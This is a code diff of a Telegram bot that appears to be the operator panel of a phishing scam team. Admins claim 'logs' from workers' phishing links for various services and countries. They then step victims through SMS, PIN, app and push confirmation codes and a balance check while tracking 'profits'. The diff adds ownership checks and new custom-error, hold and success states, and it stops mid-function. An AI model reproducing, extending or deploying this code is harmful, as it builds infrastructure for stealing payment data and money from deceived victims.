@@ -1,5 +1,6 @@
 import asyncio
 import logging
+import requests
 
 from aiogram import Bot, Dispatcher, Router, types, F
 from aiogram.fsm.context import FSMContext
@@ -8,11 +9,11 @@ from aiogram.filters import CommandStart, Command
 from aiogram.types import FSInputFile, InputMediaPhoto
 
 from core.keyboards.inline import InKeyboards, AdminInKeyboards
-from core.utils.config import TOKEN, ADMIN_CHANNEL_ID, ADMIN_LOGGING_ID
+from core.utils.config import TOKEN, ADMIN_CHANNEL_ID, ADMIN_LOGGING_ID, ADMIN_PROFITS_ID
 from core.utils.texts import texts, start_texts, admin_texts, in_keyboard_texts, log
 from core.utils.paths import paths
 from core.functions.function import Admin, User, Country, Service, Link, Request, Profits, Settings, Logs
-from core.states.state import FriendTextWait, ChangeNickname, ChangeSmartSupp, CreateLink, ChangePrice,SendAll, ChangeSubDomain,  ChangePercent, ChangeDomain, CustomText
+from core.states.state import FriendTextWait, ChangeNickname, ChangeSmartSupp, CreateLink, ChangePrice,SendAll, ChangeSubDomain,SuccessLog,  ChangePercent, ChangeDomain, CustomText, CustomError, CustomImage
 
 Form_router = Router()
 Bot_router = Router()
@@ -180,7 +181,7 @@ async def profile(callback: types.CallbackQuery):
             user['supportChat'],
             sum(item['amount'] for item in profits),
             len(profits),
-            False
+            False,admin_texts.status(user['status'])
         ),
         parse_mode="MARKDOWN")
     await bot.edit_message_media(
@@ -259,333 +260,580 @@ async def change_smartsupp_confirm(message: types.Message, state: FSMContext):
 @dp.callback_query(F.data.startswith('put_log_'))
 async def  put_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_vbiver(data, callback.from_user.id)
     _log = Logs.find_log(data)
-    link = Link.find_link(_log['link_id'])
-    service = Service.find_service(link['service']['id'])[0]
-    worker = User.find_user(link['user'])
-    admin  = User.find_user(_log['admin_id'])
-    await callback.message.edit_text(
-        text=log.log_text(service, link, worker, _log),
-        reply_markup=AdminInKeyboards.log(_log,link, service, admin)
-    )
-
+    print(_log['admin_id'])
+    if _log['admin_id'] == None or _log['admin_id'] == callback.from_user.id or _log['admin_id'] == 0:
+        Logs.change_vbiver(data, callback.from_user.id)
+        _log = Logs.find_log(data)
+        link = Link.find_link(_log['link_id'])
+        service = Service.find_service(link['service']['id'])[0]
+        worker = User.find_user(link['user'])
+        admin  = User.find_user(_log['admin_id'])
+        await callback.message.edit_text(
+            text=log.log_text(service, link, worker, _log),
+            reply_markup=AdminInKeyboards.log(_log,link, service, admin)
+        )
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('accurate_log_'))
 async def accurate_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'accurate')
     _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'accurate')
+        _log_old = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            print(_log['accurate_balance'])
-            print('____________________')
-            if _log['status'] == 'wait':
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
                 print(_log['accurate_balance'])
                 print('____________________')
-                if _log['accurate_balance'] != _log_old['accurate_balance']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])[0]
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    print('________________2323____')
-                    print(_log)
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
-
+                if _log['status'] == 'wait':
+                    print(_log['accurate_balance'])
+                    print('____________________')
+                    if _log['accurate_balance'] != _log_old['accurate_balance']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        print('________________2323____')
+                        print(_log)
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 
 @dp.callback_query(F.data.startswith('sms_log_'))
 async def sms_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'sms')
     _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'sms')
+        _log_old = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] == 'wait':
-                print(_log['sms'])
-                print('____________________')
-                if _log['sms'] != _log_old['sms']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])[0]
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    print('________________2323____')
-                    print(_log)
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] == 'wait':
+                    print(_log['sms'])
+                    print('____________________')
+                    if _log['sms'] != _log_old['sms']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        print('________________2323____')
+                        print(_log)
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('change_log_'))
 async def change_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'change')
-
     _log = Logs.find_log(data)
-    if _log['status'] == 'wait':
-        link = Link.find_link(_log['link_id'])
-        service = Service.find_service(link['service']['id'])[0]
-        worker = User.find_user(link['user'])
-        admin = User.find_user(_log['admin_id'])
+    if _log['admin_id'] == callback.from_user.id:
 
-        await callback.message.edit_text(
-          text=log.log_text(service, link, worker, _log),
-            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+        Logs.change_status(data, 'change')
+
+        _log = Logs.find_log(data)
+        if _log['status'] == 'wait':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+
+            await callback.message.edit_text(
+              text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
         )
-    return
 @dp.callback_query(F.data.startswith('custom_text_'))
 async def custom_text(callback: types.CallbackQuery, state: FSMContext):
     data = callback.data.split('_')[2]
 
     _log_old = Logs.find_log(data)
-    await callback.message.edit_text(
-        text=log.wait_text,
-        reply_markup=AdminInKeyboards.back(_log_old['id'])
-    )
-    await state.set_state(CustomText.message)
-    await state.update_data(message=callback.message.message_id)
-    await state.set_state(CustomText.log)
-    await state.update_data(log=data)
-    await state.set_state(CustomText.text)
-
+    if _log_old['admin_id'] == callback.from_user.id:
+        await callback.message.edit_text(
+            text=log.wait_text,
+            reply_markup=AdminInKeyboards.back(f"log_{_log_old['id']}")
+        )
+        await state.set_state(CustomText.message)
+        await state.update_data(message=callback.message.message_id)
+        await state.set_state(CustomText.log)
+        await state.update_data(log=data)
+        await state.set_state(CustomText.text)
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @Bot_router.message(CustomText.text)
 async def custom_text(message: types.Message, state: FSMContext):
     data = await state.update_data(text=message.text)
     print(data['log'])
-    Logs.change_custom_text(data['log'], message.text)
-    Logs.change_status(data['log'], 'custom_text')
+
     _log_old = Logs.find_log(data['log'])
-
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            print(_log['custom_text'])
-            print('____________________')
-            if _log['status'] == 'wait':
-                print(_log['custom_text'])
+    if _log_old['admin_id'] == message.from_user.id:
+        Logs.change_custom_text(data['log'], message.text)
+        Logs.change_status(data['log'], 'custom_text')
+        _log_old = Logs.find_log(data['log'])
+        link = Link.find_link(_log_old['link_id'])
+        service = Service.find_service(link['service']['id'])[0]
+        worker = User.find_user(link['user'])
+        admin = User.find_user(_log_old['admin_id'])
+        await bot.edit_message_text(
+            chat_id=ADMIN_LOGGING_ID,
+            message_id=data['message'],
+            text=log.log_text(service, link, worker, _log_old),
+            reply_markup=AdminInKeyboards.log(_log_old, link, service, admin)
+        )
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data['log'])
+                print(_log)
                 print('____________________')
-                if _log['custom_text'] != _log_old['custom_text']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])[0]
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    print('________________2323____')
-                    print(_log)
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
+                if _log['status'] == 'wait':
+                    print(_log['custom_text'])
+                    print('____________________')
+                    if _log['custom_text'] != _log_old['custom_text']:
+                        _log = Logs.find_log(data['log'])
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        await bot.edit_message_text(
+                            chat_id=ADMIN_LOGGING_ID,
+                            message_id=data['message'],
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
 
-    asyncio.ensure_future(background_task())
-    await state.clear()
+        asyncio.ensure_future(background_task())
+        await state.clear()
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+@dp.callback_query(F.data.startswith('custom_error_'))
+async def custom_text(callback: types.CallbackQuery, state: FSMContext):
+    data = callback.data.split('_')[2]
 
-@dp.message(chat_id=ADMIN_LOGGING_ID)
-async def message(message: types.Message):
-    print(message.text)
-    return
+    _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        await callback.message.edit_text(
+            text=log.wait_text,
+            reply_markup=AdminInKeyboards.back(f"log_{_log_old['id']}")
+        )
+        await state.set_state(CustomError.message)
+        await state.update_data(message=callback.message.message_id)
+        await state.set_state(CustomError.log)
+        await state.update_data(log=data)
+        await state.set_state(CustomError.text)
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+@Bot_router.message(CustomError.text)
+async def custom_error(message: types.Message, state: FSMContext):
+    data = await state.update_data(text=message.text)
+    print(data['log'])
+    _log_old = Logs.find_log(data['log'])
+    if _log_old['admin_id'] == message.from_user.id:
+        Logs.change_custom_error(data['log'], message.text)
+        Logs.change_status(data['log'], 'custom_error')
+        _log_old = Logs.find_log(data['log'])
+        link = Link.find_link(_log_old['link_id'])
+        service = Service.find_service(link['service']['id'])[0]
+        worker = User.find_user(link['user'])
+        admin = User.find_user(_log_old['admin_id'])
+        await bot.edit_message_text(
+            chat_id=ADMIN_LOGGING_ID,
+            message_id=data['message'],
+            text=log.log_text(service, link, worker, _log_old),
+            reply_markup=AdminInKeyboards.log(_log_old, link, service, admin)
+        )
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data['log'])
+                print(_log)
+                print('____________________')
+                if _log['status'] == 'wait':
+                    print(_log['custom_error'])
+                    print('____________________')
+                    if _log['custom_error'] != _log_old['custom_error']:
+                        _log = Logs.find_log(data['log'])
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        await bot.edit_message_text(
+                            chat_id=ADMIN_LOGGING_ID,
+                            message_id=data['message'],
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
 
+        asyncio.ensure_future(background_task())
+        await state.clear()
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 
 @dp.callback_query(F.data.startswith('log_'))
 async def log_menu(callback: types.CallbackQuery, state:FSMContext):
     await state.clear()
     data = callback.data.split('_')[1]
     _log = Logs.find_log(data)
-    link = Link.find_link(_log['link_id'])
-    service = Service.find_service(link['service']['id'])[0]
-    worker = User.find_user(link['user'])
-    admin = User.find_user(_log['admin_id'])
-    await callback.message.edit_text(
-        text=log.log_text(service, link, worker, _log),
-        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-    )
-    return
+    if _log['admin_id'] == callback.from_user.id:
+        link = Link.find_link(_log['link_id'])
+        service = Service.find_service(link['service']['id'])[0]
+        worker = User.find_user(link['user'])
+        admin = User.find_user(_log['admin_id'])
+        await callback.message.edit_text(
+            text=log.log_text(service, link, worker, _log),
+            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+        )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('push_log_'))
 async def push_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'push')
     _log = Logs.find_log(data)
-    if _log['status'] == 'wait':
-        link = Link.find_link(_log['link_id'])
-        service = Service.find_service(link['service']['id'])[0]
-        worker = User.find_user(link['user'])
-        admin = User.find_user(_log['admin_id'])
-        await callback.message.edit_text(
-            text=log.log_text(service, link, worker, _log),
-            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'push')
+        _log = Logs.find_log(data)
+        if _log['status'] == 'wait':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
         )
-    return
+@dp.callback_query(F.data.startswith('success_hold_log_'))
+async def success_hold_log(callback:types.CallbackQuery):
+    data = callback.data.split('_')[3]
+    _log = Logs.find_log(data)
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'success_hold')
+        _log = Logs.find_log(data)
 
+        if _log['status'] == 'wait':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+@dp.callback_query(F.data.startswith('error_hold_log_'))
+async def success_hold_log(callback:types.CallbackQuery):
+    data = callback.data.split('_')[3]
+    _log = Logs.find_log(data)
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'error_hold')
+        _log = Logs.find_log(data)
+        if _log['status'] == 'wait':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('deposit_log_'))
 async def deposit_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'deposit')
     _log = Logs.find_log(data)
-    if _log['status'] == 'wait':
-        link = Link.find_link(_log['link_id'])
-        service = Service.find_service(link['service']['id'])[0]
-        worker = User.find_user(link['user'])
-        admin = User.find_user(_log['admin_id'])
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'deposit')
+        _log = Logs.find_log(data)
 
-        await callback.message.edit_text(
-            text=log.log_text(service, link, worker, _log),
-            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+        if _log['status'] == 'wait':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
         )
-    return
 @dp.callback_query(F.data.startswith('limit_log_'))
 async def limits_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'limit')
     _log = Logs.find_log(data)
-    if _log['status'] == 'limit':
-        link = Link.find_link(_log['link_id'])
-        service = Service.find_service(link['service']['id'])[0]
-        worker = User.find_user(link['user'])
-        admin = User.find_user(_log['admin_id'])
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'limit')
+        _log = Logs.find_log(data)
 
-        await callback.message.edit_text(
-            text=log.log_text(service, link, worker, _log),
-            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+        if _log['status'] == 'limit':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])[0]
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+            )
+        return
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
         )
-    return
 @dp.callback_query(F.data.startswith('app_code_log_'))
 async def app_code_log(callback: types.CallbackQuery):
-    data = callback.data.split('_')[2]
-    Logs.change_status(data, 'app_code')
+    data = callback.data.split('_')[3]
     _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'app')
+        _log_old = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] == 'wait':
-                print(_log['app_code'])
-                print('____________________')
-                if _log['app_code'] != _log_old['app_code']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])[0]
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    print('________________2323____')
-                    print(_log)
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
-
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] == 'wait':
+                    print(_log['app'])
+                    print('____________________')
+                    if _log['app'] != _log_old['app']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        print('________________2323____')
+                        print(_log)
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('call_code_log_'))
 async def call_code_log(callback: types.CallbackQuery):
-    data = callback.data.split('_')[2]
-    Logs.change_status(data, 'call_code')
+    data = callback.data.split('_')[3]
     _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'call')
+        _log_old = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] == 'wait':
-                print(_log['call_code'])
-                print('____________________')
-                if _log['call_code'] != _log_old['call_code']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])[0]
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    print('________________2323____')
-                    print(_log)
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link, service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] == 'wait':
+                    print(_log['call'])
+                    print('____________________')
+                    if _log['call'] != _log_old['call']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        print('________________2323____')
+                        print(_log)
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+@dp.callback_query(F.data.startswith('pin_code_log_'))
+async def call_code_log(callback: types.CallbackQuery):
+    data = callback.data.split('_')[3]
+    _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'pin')
+        _log_old = Logs.find_log(data)
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] == 'wait':
+                    print(_log['pin'])
+                    print('____________________')
+                    if _log['pin'] != _log_old['pin']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])[0]
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        print('________________2323____')
+                        print(_log)
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link, service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('error_code_log_'))
 async def error_code_log(callback: types.CallbackQuery):
-    data = callback.data.split('_')[2]
-    Logs.change_status(data, 'code')
+    data = callback.data.split('_')[3]
     _log_old = Logs.find_log(data)
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'code')
+        _log_old = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] == 'wait':
-                if _log['code'] != _log_old['code']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link,service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] == 'wait':
+                    if _log['code'] != _log_old['code']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link,service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data.startswith('error_push_log_'))
 async def error_push_log(callback: types.CallbackQuery):
-    data = callback.data.split('_')[2]
-    Logs.change_status(data, 'push')
-    _log_old = Logs.find_log(data)
+    data = callback.data.split('_')[3]
+    _log = Logs.find_log(data)
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'push')
+        _log = Logs.find_log(data)
 
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] != 'wait':
-                if _log['push'] != _log_old['push']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link,service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
+        if _log['status'] == 'push':
+            link = Link.find_link(_log['link_id'])
+            service = Service.find_service(link['service']['id'])
+            worker = User.find_user(link['user'])
+            admin = User.find_user(_log['admin_id'])
+            await callback.message.edit_text(
+                text=log.log_text(service, link, worker, _log),
+                reply_markup=AdminInKeyboards.log(_log, link,service, admin)
+            )
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+
 @dp.callback_query(F.data.startswith('pin_code_log_'))
 async def pin_code_log(callback: types.CallbackQuery):
     data = callback.data.split('_')[2]
-    Logs.change_status(data, 'pin_code')
     _log_old = Logs.find_log(data)
-
-    async def background_task():
-        while True:
-            _log = Logs.find_log(data)
-            if _log['status'] != 'wait':
-                if _log['pin_code'] != _log_old['pin_code']:
-                    _log = Logs.find_log(data)
-                    link = Link.find_link(_log['link_id'])
-                    service = Service.find_service(link['service']['id'])
-                    worker = User.find_user(link['user'])
-                    admin = User.find_user(_log['admin_id'])
-                    await callback.message.edit_text(
-                        text=log.log_text(service, link, worker, _log),
-                        reply_markup=AdminInKeyboards.log(_log, link,service, admin)
-                    )
-                    break
-            await asyncio.sleep(1)
-    asyncio.ensure_future(background_task())
+    if _log_old['admin_id'] == callback.from_user.id:
+        Logs.change_status(data, 'pin_code')
+        _log_old = Logs.find_log(data)
+        async def background_task():
+            while True:
+                _log = Logs.find_log(data)
+                if _log['status'] != 'wait':
+                    if _log['pin_code'] != _log_old['pin_code']:
+                        _log = Logs.find_log(data)
+                        link = Link.find_link(_log['link_id'])
+                        service = Service.find_service(link['service']['id'])
+                        worker = User.find_user(link['user'])
+                        admin = User.find_user(_log['admin_id'])
+                        await callback.message.edit_text(
+                            text=log.log_text(service, link, worker, _log),
+                            reply_markup=AdminInKeyboards.log(_log, link,service, admin)
+                        )
+                        break
+                await asyncio.sleep(1)
+        asyncio.ensure_future(background_task())
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
 @dp.callback_query(F.data == "create_link")
 async def create_link(callback: types.CallbackQuery, state: FSMContext):
     countries = Country.get_all_active_countries()
@@ -656,7 +904,7 @@ async def request(callback: types.CallbackQuery):
                 reply_markup=AdminInKeyboards.new_user_keyboard(request['user_id'], request['username'], request['message_id'],True, request['textType'])
             )
 @dp.callback_query(F.data.startswith("admin_request_page_"))
-async def requests(callback: types.CallbackQuery):
+async def _requests(callback: types.CallbackQuery):
     data = callback.data.split('_')
     page = int(data[3])
     items_per_page = 10
@@ -664,13 +912,127 @@ async def requests(callback: types.CallbackQuery):
     end_index = (page + 1) * items_per_page
     requests = Request.get_all_requests()
     currentRequests = requests[start_index:end_index]
-    await bot.send_message(
+    await bot.edit_message_caption(
         chat_id=callback.message.chat.id,
+        message_id=callback.message.message_id,
         reply_markup=AdminInKeyboards.admin_requests(currentRequests, page, end_index),
-        text=admin_texts.requests(len(requests))
+        caption=admin_texts.requests(len(requests))
     )
-    await callback.message.delete()
 
+@dp.callback_query(F.data.startswith('success_log_'))
+async def success_log(callback: types.CallbackQuery,state:FSMContext):
+
+    data = callback.data.split('_')[2]
+    _log = Logs.find_log(data)
+    if _log['admin_id'] == callback.from_user.id:
+        await state.set_state(SuccessLog.message)
+        await state.update_data(message=callback.message.message_id)
+        await state.set_state(SuccessLog.log)
+        await state.update_data(log=data)
+        await state.set_state(SuccessLog.amount)
+        await callback.message.edit_text(
+            text=log.success_log_wait,
+            reply_markup=AdminInKeyboards.back(f'log_{_log["id"]}')
+        )
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+
+@dp.callback_query(F.data.startswith('decline_log_'))
+async def decline_log(callback: types.CallbackQuery,state:FSMContext):
+
+    data = callback.data.split('_')[2]
+
+    _log = Logs.find_log(data)
+    if _log['admin_id'] == callback.from_user.id:
+        Logs.change_vbiver(_log['id'], 0)
+        link = Link.find_link(_log['link_id'])
+        print('-----------')
+        print(link)
+        service = Service.find_service(link['service']['id'])[0]
+        print('-----------')
+        print(service)
+        worker = User.find_user(link['user'])
+        await callback.message.edit_text(
+            text=log.log_request(_log, service, link,worker),
+            reply_markup=AdminInKeyboards.put_log(f'put_log_{_log["id"]}')
+        )
+    else:
+        await callback.answer(
+            text=admin_texts.not_your_link,
+            show_alert=True
+        )
+
+@Bot_router.message(SuccessLog.amount)
+async def success_amount(message: types.Message, state: FSMContext):
